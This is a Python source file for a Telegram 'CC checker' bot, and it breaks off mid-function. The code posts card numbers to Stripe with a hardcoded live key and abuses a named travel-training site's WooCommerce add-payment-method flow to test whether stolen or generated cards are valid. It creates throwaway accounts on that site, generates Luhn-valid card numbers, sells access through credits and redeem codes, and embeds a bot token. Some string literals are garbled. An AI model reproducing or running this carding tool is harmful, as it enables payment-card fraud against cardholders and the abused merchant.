import requests
import telebot
import time
import re
import os
import json
from telebot import types
from bs4 import BeautifulSoup
import random
import string
import uuid

# -------------------- API Logic (Embedded gatet.py) --------------------
def Tele(session, cc):
    try:
        card, mm, yy, cvv = cc.split("|")
        if "20" in yy:
            yy = yy.split("20")[1]

        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
        }

        data = f'type=card&card[number]={card}&card[cvc]={cvv}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US&key=pk_live_51JDCsoADgv2TCwvpbUjPOeSLExPJKxg1uzTT9qWQjvjOYBb4TiEqnZI1Sd0Kz5WsJszMIXXcIMDwqQ2Rf5oOFQgD00YuWWyZWX'
        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=20)
        res = response.text

        if 'error' in res:
            error_message = response.json()['error']['message']
            if 'code' in error_message:
                return "CCN ✅"
            else:
                return "DECLINED ❌"
        else:
            payment_method_id = response.json()['id']

            headers = {
                'authority': 'www.thetravelinstitute.com',
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://www.thetravelinstitute.com',
                'referer': 'https://www.thetravelinstitute.com/my-account/add-payment-method/',
                'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
                'x-requested-with': 'XMLHttpRequest',
            }

            params = {
                'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
            }
            response = session.get('https://www.thetravelinstitute.com/my-account/add-payment-method/', headers=headers,timeout=20)
            html=(response.text)
            nonce = re.search(r'createAndConfirmSetupIntentNonce":"([^"]+)"', html).group(1)

            data = {
                'action': 'create_and_confirm_setup_intent',
                'wc-stripe-payment-method': payment_method_id,
                'wc-stripe-payment-type': 'card',
                '_ajax_nonce': nonce,
            }

            response = session.post('https://www.thetravelinstitute.com/', params=params, headers=headers, data=data, timeout=20)
            res = response.json()

            if res['success'] == False:
                error = res['data']['error']['message']
                if 'code' in error:
                     return "CCN ✅"
                else:
                    return "DECLINED ❌"
            else:
                return "APPROVED ✅"

    except Exception as e:
        print(f"Error in Tele function: {e}")
        return "Error"

# -------------------- End of API Logic --------------------

token = '7728685834:AAEi2xms7e_PglfC_5S-iHdyDIlMBAV94y4'
bot = telebot.TeleBot(token, parse_mode="HTML")
subscriber = '6317271346'
allowed_users = ['6317271346']
pending_users = {}  # Store pending user requests
CREDIT_FILE = 'user_credits.json'

# --- Credit System Functions ---
def load_credits():
    try:
        with open(CREDIT_FILE, 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_credits(credits):
    with open(CREDIT_FILE, 'w') as f:
        json.dump(credits, f, indent=4)

def get_user_credits(user_id):
    credits = load_credits()
    return credits.get(str(user_id), 0)

def set_user_credits(user_id, amount):
    credits = load_credits()
    credits[str(user_id)] = amount
    save_credits(credits)

def deduct_credits(user_id, amount=1):
    credits = load_credits()
    user_str_id = str(user_id)
    current_credits = credits.get(user_str_id, 0)
    if current_credits >= amount:
        credits[user_str_id] = current_credits - amount
        save_credits(credits)
        return True
    return False

def add_credits(user_id, amount):
    credits = load_credits()
    user_str_id = str(user_id)
    current_credits = credits.get(user_str_id, 0)
    credits[user_str_id] = current_credits + amount
    save_credits(credits)

# --- CC Generator Function ---
def generate_credit_card():
    # Simple CC generator (example: Visa cards starting with 4)
    prefixes = ['4', '51', '52', '53', '54', '55']  # Visa and Mastercard prefixes
    prefix = random.choice(prefixes)
    length = 16
    card_number = prefix + ''.join(random.choice(string.digits) for _ in range(length - len(prefix) - 1))
    # Calculate checksum (Luhn algorithm)
    digits = [int(d) for d in card_number]
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    checksum = sum(odd_digits)
    for d in even_digits:
        checksum += sum(divmod(d * 2, 10))
    card_number += str((10 - checksum % 10) % 10)
    
    # Generate random expiry and CVV
    month = str(random.randint(1, 12)).zfill(2)
    year = str(random.randint(25, 30)).zfill(2)  # Future years
    cvv = ''.join(random.choice(string.digits) for _ in range(3))
    
    return f"{card_number}|{month}|{year}|{cvv}"

# --- Bot Handlers ---

@bot.message_handler(commands=["start"])
def start(message):
    user_id = message.chat.id
    if str(user_id) not in allowed_users:
        pending_users[str(user_id)] = message.from_user.username or "No username"
        bot.reply_to(message, "🚨 Your request to use the bot has been sent to the admin for approval. Please wait for confirmation.")
        bot.send_message(subscriber, f"New user request:\nID: {user_id}\nUsername: {pending_users[str(user_id)]}\nUse /approve {user_id} or /deny {user_id}")
        return

    credits = get_user_credits(user_id)
    if credits == 0:
        set_user_credits(user_id, 500)
        bot.reply_to(message, f"🎉 𝐖𝐞𝐥𝐜𝐨𝐦𝐞! 𝐘𝐨𝐮 𝐡𝐚𝐯𝐞 𝐛𝐞𝐞𝐧 𝐠𝐫𝐚𝐧𝐭𝐞𝐝 premium 500 𝐜𝐫𝐞𝐝𝐢𝐭𝐬. 𝐒𝐞𝐧𝐝 𝐭𝐡𝐞 𝐭𝐱𝐭 𝐟𝐢𝐥𝐞 𝐧𝐨𝐰, 𝐮𝐬𝐞 /chk 𝐭𝐨 𝐜𝐡𝐞𝐜𝐤 𝐬𝐢𝐧𝐠𝐥𝐞 𝐜𝐚𝐫𝐝, or /gen to generate a card. 𝐘𝐨𝐮𝐫 𝐜𝐫𝐞𝐝𝐢𝐭𝐬: <code>{get_user_credits(user_id)}</code>", parse_mode="HTML")
    else:
        bot.reply_to(message, f"𝐒𝐞𝐧𝐝 𝐭𝐡𝐞 𝐭𝐱𝐭 𝐟𝐢𝐥𝐞 𝐧𝐨𝐰, 𝐮𝐬𝐞 /chk 𝐭𝐨 𝐜𝐡𝐞𝐜𝐤 𝐬𝐢𝐧𝐠𝐥𝐞 𝐜𝐚𝐫𝐝, or /gen to generate a card. 𝐘𝐨𝐮𝐫 𝐜𝐫𝐞𝐝𝐢𝐭𝐬: <code>{get_user_credits(user_id)}</code>", parse_mode="HTML")

@bot.message_handler(commands=["approve"])
def approve_user(message):
    if str(message.chat.id) != subscriber:
        bot.reply_to(message, "You do not have permission to approve users.🚫")
        return
    try:
        user_id = message.text.split()[1]
        if user_id in pending_users:
            allowed_users.append(user_id)
            set_user_credits(user_id, 500)  # Grant initial credits
            bot.send_message(user_id, "✅ Your request has been approved! You can now use the bot. 500 credits have been added to your account.")
            bot.reply_to(message, f"User ID {user_id} has been approved and added with 500 credits.✅")
            del pending_users[user_id]
        else:
            bot.reply_to(message, "User ID not found in pending requests.🚫")
    except IndexError:
        bot.reply_to(message, "Please provide a valid user ID. Example: /approve 123456789")

@bot.message_handler(commands=["deny"])
def deny_user(message):
    if str(message.chat.id) != subscriber:
        bot.reply_to(message, "You do not have permission to deny users.🚫")
        return
    try:
        user_id = message.text.split()[1]
        if user_id in pending_users:
            bot.send_message(user_id, "❌ Your request to use the bot has been denied by the admin.")
            bot.reply_to(message, f"User ID {user_id} has been denied.✅")
            del pending_users[user_id]
        else:
            bot.reply_to(message, "User ID not found in pending requests.🚫")
    except IndexError:
        bot.reply_to(message, "Please provide a valid user ID. Example: /deny 123456789")

@bot.message_handler(commands=["addcredits"])
def add_credits_command(message):
    if str(message.chat.id) != subscriber:
        bot.reply_to(message, "You do not have permission to add credits.🚫")
        return
    try:
        user_id, amount = message.text.split()[1:3]
        amount = int(amount)
        add_credits(user_id, amount)
        bot.reply_to(message, f"Added {amount} credits to user ID {user_id}. New balance: <code>{get_user_credits(user_id)}</code>", parse_mode="HTML")
        bot.send_message(user_id, f"🎉 You have received {amount} credits! Your new balance: <code>{get_user_credits(user_id)}</code>", parse_mode="HTML")
    except (IndexError, ValueError):
        bot.reply_to(message, "Please provide a valid user ID and amount. Example: /addcredits 123456789 100")

@bot.message_handler(commands=["add"])
def add_user(message):
    if str(message.chat.id) == subscriber:
        try:
            new_user_id = message.text.split()[1]
            allowed_users.append(new_user_id)
            bot.reply_to(message, f"User ID {new_user_id} Has Been Added Successfully.✅\nCongratulations! Premium New User🎉✅ ")
        except IndexError:
            bot.reply_to(message, "Please provide a valid user ID. Example: /add 123456789")
    else:
        bot.reply_to(message, "You do not have permission to add users.🚫")

@bot.message_handler(commands=["delete"])
def delete_user(message):
    if str(message.chat.id) == subscriber:
        try:
            user_id_to_delete = message.text.split()[1]
            if user_id_to_delete in allowed_users:
                allowed_users.remove(user_id_to_delete)
                bot.reply_to(message, f"User ID {user_id_to_delete} has been removed successfully.✅")
            else:
                bot.reply_to(message, "User ID not found in the list.🚫")
        except IndexError:
            bot.reply_to(message, "Please provide a valid user ID. Example: /delete 123456789")
    else:
        bot.reply_to(message, "You do not have permission to delete users.🚫")

valid_redeem_codes = []

def generate_redeem_code():
    code = '-'.join(''.join(random.choices(string.ascii_uppercase + string.digits, k=4)) for _ in range(3))
    return code

@bot.message_handler(commands=["code"])
def generate_code(message):
    if str(message.chat.id) == subscriber or str(message.chat.id) == str(6658831303):
        new_code = generate_redeem_code()
        new_code = "GOKU-"+new_code
        valid_redeem_codes.append(new_code)
        bot.reply_to(
            message,
            f"<b>🎉 New Redeem Code 🎉</b>\n\n"
            f"<code>{new_code}</code>\n\n"
            f"Use this code to redeem your access and get 500 credits!",
            parse_mode="HTML"
        )
    else:
        bot.reply_to(message, "You do not have permission to generate redeem codes.🚫")

@bot.message_handler(commands=["redeem"])
def redeem_code(message):
    user_id = message.chat.id
    try:
        redeem_code = message.text.split()[1]
    except IndexError:
        bot.reply_to(message, "Please provide a valid redeem code. Example: /redeem XXXX-XXXX-XXXX")
        return

    if redeem_code in valid_redeem_codes:
        if str(user_id) not in allowed_users:
            allowed_users.append(str(user_id))
            valid_redeem_codes.remove(redeem_code)
            add_credits(user_id, 500)
            bot.reply_to(message, f"Redeem code <code>{redeem_code}</code> has been successfully redeemed.✅ You now have access to the bot and received <b>500 credits</b>! Your current credits: <code>{get_user_credits(user_id)}</code>", parse_mode="HTML")
        else:
            add_credits(user_id, 500)
            bot.reply_to(message, f"Redeem code <code>{redeem_code}</code> has been successfully redeemed.✅ <b>500 credits</b> added to your account! Your current credits: <code>{get_user_credits(user_id)}</code>", parse_mode="HTML")
    else:
        bot.reply_to(message, "Invalid redeem code. Please check and try again.")

def create_session():
    try:
        session = requests.Session()
        email = generate_random_email()
        headers = {
            'authority': 'www.thetravelinstitute.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
        }

        response = session.get('https://www.thetravelinstitute.com/register/', headers=headers, timeout=20)
        html = (response.text)
        soup = BeautifulSoup(html, 'html.parser')
        nonce = soup.find('input', {'id': 'afurd_field_nonce'})['value']
        noncee = soup.find('input', {'id': 'woocommerce-register-nonce'})['value']
        headers = {
            'authority': 'www.thetravelinstitute.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.thetravelinstitute.com',
            'referer': 'https://www.thetravelinstitute.com/register/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
        }
        data = [
            ('afurd_field_nonce', f'{nonce}'),
            ('_wp_http_referer', '/register/'),
            ('pre_page', ''),
            ('email', f'{email}'),
            ('password', 'Esahatam2009@'),
            ('wc_order_attribution_source_type', 'typein'),
            ('wc_order_attribution_referrer', 'https://www.thetravelinstitute.com/my-account/payment-methods/'),
            ('wc_order_attribution_utm_campaign', '(none)'),
            ('wc_order_attribution_utm_source', '(direct)'),
            ('wc_order_attribution_utm_medium', '(none)'),
            ('wc_order_attribution_utm_content', '(none)'),
            ('wc_order_attribution_utm_id', '(none)'),
            ('wc_order_attribution_utm_term', '(none)'),
            ('wc_order_attribution_utm_source_platform', '(none)'),
            ('wc_order_attribution_utm_creative_format', '(none)'),
            ('wc_order_attribution_utm_marketing_tactic', '(none)'),
            ('wc_order_attribution_session_entry', 'https://www.thetravelinstitute.com/my-account/add-payment-method/'),
            ('wc_order_attribution_session_start_time', '2024-11-17 09:43:38'),
            ('wc_order_attribution_session_pages', '8'),
            ('wc_order_attribution_session_count', '1'),
            ('wc_order_attribution_user_agent',
             'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'),
            ('woocommerce-register-nonce', f'{noncee}'),
            ('_wp_http_referer', '/register/'),
            ('register', 'Register'),
        ]

        response = session.post('https://www.thetravelinstitute.com/register/', headers=headers, data=data, timeout=20)
        if response.status_code == 200:
            with open('Creds.txt', 'a') as f:
                f.write(email + ':' + 'Esahatam2009@')
            return session
        else:
            return None
    except Exception as e:
        return None

def save_session_to_file(session, file_path):
    with open(file_path, "w") as file:
        cookies = session.cookies.get_dict()
        file.write(str(cookies))

def load_session_from_file(file_path):
    try:
        with open(file_path, "r") as file:
            session_data = file.read().strip()
            session = requests.Session()
            cookies = eval(session_data)
            session.cookies.update(cookies)
            return session
    except Exception as e:
        return None

def manage_session_file():
    session_file = "session.txt"
    if os.path.exists(session_file):
        session = load_session_from_file(session_file)
        if session:
            return session
    session = create_session()
    if session:
        save_session_to_file(session, session_file)
        return session
    return None

def generate_random_email(length=8, domain=None):
    common_domains = ["gmail.com"]
    if not domain:
        domain = random.choice(common_domains)
    username_characters = string.ascii_letters + string.digits
    username = ''.join(random.choice(username_characters) for _ in range(length))
    return f"{username}@{domain}"

def extract_ccs_from_line(line):
    cc_pattern = re.compile(r'\b(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})\b')
    matches = cc_pattern.findall(line)
    ccs = []
    for match in matches:
        ccs.append("|".join(match))
    return ccs

@bot.message_handler(commands=["gen"])
def generate_card_command(message):
    user_id = message.chat.id
    if str(user_id) not in allowed_users:
        bot.reply_to(message, "🚫 𝐘𝐨𝐮 𝐜𝐚𝐧𝐧𝐨𝐭 𝐮𝐬𝐞 𝐭𝐡𝐞 𝐛𝐨𝐭 𝐭𝐨 𝐜𝐨𝐧𝐭𝐚𝐜𝐭 𝐝𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫𝐬 𝐭𝐨 𝐩𝐮𝐫𝐜𝐡𝐚𝐬𝐞 𝐚 𝐛𝐨𝐭 𝐬𝐮𝐛𝐬𝐜𝐫𝐢𝐩𝐭𝐢𝐨𝐧 @GOKUOFFICIALREAL_BOT")
        return

    if str(user_id) != subscriber:
        credits_available = get_user_credits(user_id)
        if credits_available < 1:
            bot.reply_to(message, f"🚫 𝐈𝐧𝐬𝐮𝐟𝐟𝐢𝐜𝐢𝐞𝐧𝐭 𝐜𝐫𝐞�{d𝐢𝐭𝐬. 𝐘𝐨𝐮 𝐡𝐚𝐯𝐞 <code>{credits_available}</code> 𝐜𝐫𝐞𝐝𝐢𝐭𝐬. 𝐑𝐞𝐝𝐞𝐞𝐦 𝐜𝐨𝐝𝐞𝐬 𝐨𝐫 𝐜𝐨𝐧𝐭𝐚𝐜𝐭 𝐝𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫.", parse_mode="HTML")
            return
        if not deduct_credits(user_id, 1):
            bot.reply_to(message, "🚫 𝐄𝐫𝐫𝐨𝐫 𝐝𝐞�{d𝐮𝐜𝐭𝐢𝐧𝐠 𝐜𝐫𝐞𝐝𝐢𝐭𝐬. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐭𝐫𝐲 𝐚𝐠𝐚𝐢𝐧 𝐥𝐚𝐭𝐞𝐫.")
            return

    cc = generate_credit_card()
    bot.reply_to(message, f"🎴 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞𝐝 𝐂𝐫𝐞𝐝𝐢𝐭 𝐂𝐚𝐫𝐝:\n<code>{cc}</code>\n𝐂𝐫𝐞𝐝𝐢𝐭𝐬 𝐫𝐞𝐦𝐚𝐢𝐧𝐢𝐧𝐠: <code>{get_user_credits(user_id)}</code>", parse_mode="HTML")

@bot.message_handler(commands=["chk", "check", "bin", "戮", "validate", '验卡', 'cc', 'card', 'info', '栓卡', '查询', '.chk'])
def check_single_card_command(message):
    user_id = message.chat.id
    if str(user_id) not in allowed_users:
        bot.reply_to(message, "🚫 𝐘𝐨